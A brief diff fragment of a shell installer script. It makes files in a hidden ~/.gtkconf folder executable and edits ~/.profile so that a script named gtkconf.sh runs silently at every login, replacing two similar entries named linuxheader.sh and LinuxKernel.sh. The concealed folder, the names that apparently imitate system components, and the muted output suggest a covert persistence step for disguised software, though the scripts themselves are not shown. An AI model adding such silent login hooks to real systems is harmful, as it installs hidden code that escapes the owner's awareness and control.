@@ -10,5 +10,5 @@ rm gtkconf.tar.gz
 chmod +x $HOME/.gtkconf/*
 
 
-echo "$HOME/.gtkconf/linuxheader.sh>/dev/null 2>&1" >>$HOME/.profile
-echo "$HOME/.gtkconf/LinuxKernel.sh>/dev/null 2>&1" >>$HOME/.profile
+echo "$HOME/.gtkconf/gtkconf.sh>/dev/null 2>&1" >>$HOME/.profile
+
